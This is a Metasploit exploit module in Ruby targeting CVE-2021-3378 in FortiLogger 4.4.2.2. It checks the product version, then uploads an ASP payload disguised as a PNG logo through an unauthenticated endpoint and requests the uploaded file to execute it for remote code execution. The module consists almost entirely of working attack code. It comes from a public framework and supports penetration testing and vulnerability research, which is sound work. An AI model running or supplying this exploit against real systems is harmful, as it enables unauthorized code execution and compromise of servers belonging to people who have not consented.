##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::EXE
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FortiLogger Arbitrary File Upload Exploit',
        'Description' => %q{
            This module exploits an unauthenticated arbitrary file upload
            via insecure POST request. It has been tested on version 4.4.2.2 in
            Windows 10 Enterprise.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Berkan Er <b3rsec@protonmail.com>' # Vulnerability discovery, PoC and Metasploit module
          ],
        'References' =>
          [
            ['CVE', '2021-3378'],
            ['URL', 'https://erberkan.github.io/2021/cve-2021-3378/']
          ],

        'Platform' => ['win'],
        'Privileged' => false,
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' =>
          [
            [
              'FortiLogger - 4.4.2.2',
              {
                'Platform' => 'win'
              }
            ],
          ],
        'DisclosureDate' => '2021-02-26',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The base path to the FortiLogger', '/'])
      ], self.class
    )
  end

  def check_product_info
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/shared/GetProductInfo'),
      'method' => 'POST',
      'data' => '',
      'headers' => {
        'Accept' => 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language' => 'en-US,en;q=0.5',
        'Accept-Encoding' => 'gzip, deflate',
        'X-Requested-With' => 'XMLHttpRequest'
      }
    )
  end

  def check
    begin
      res = check_product_info
      if res && res.code == 200
        if JSON.parse(res.body)['Version'] == '4.4.2.2'
          Exploit::CheckCode::Vulnerable
        else
          Exploit::CheckCode::Safe
        end
      end
    rescue JSON::ParserError
      Exploit::CheckCode::Safe
    end
  end

  def create_payload
    Msf::Util::EXE.to_exe_asp(generate_payload_exe).to_s
  end

  def exploit
    begin
      print_good('Generate Payload !')
      data = create_payload

      boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(10) + 5)}"
      post_data = "--#{boundary}\r\n"
      post_data << "Content-Disposition: form-data; name=\"file\"; filename=\"b3r.asp\"\r\n"
      post_data << "Content-Type: image/png\r\n"
      post_data << "\r\n#{data}\r\n"
      post_data << "--#{boundary}\r\n"

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/Config/SaveUploadedHotspotLogoFile'),
        'ctype' => "multipart/form-data; boundary=#{boundary}",
        'data' => post_data,
        'headers' => {
          'Accept' => 'application/json',
          'Accept-Language' => 'en-US,en;q=0.5',
          'X-Requested-With' => 'XMLHttpRequest'
        }
      )
      if res && res.code == 200
        if JSON.parse(res.body)['Message'] == 'Error in saving file'
          print_error('Error for upload payload..')
        else
          print_good('Payload has been uploaded !')

          handler

          print_status('Executing payload...')
          send_request_cgi({
            'uri' => normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),
            'method' => 'GET'
          }, 5)
        end
      end
    end
  end
end
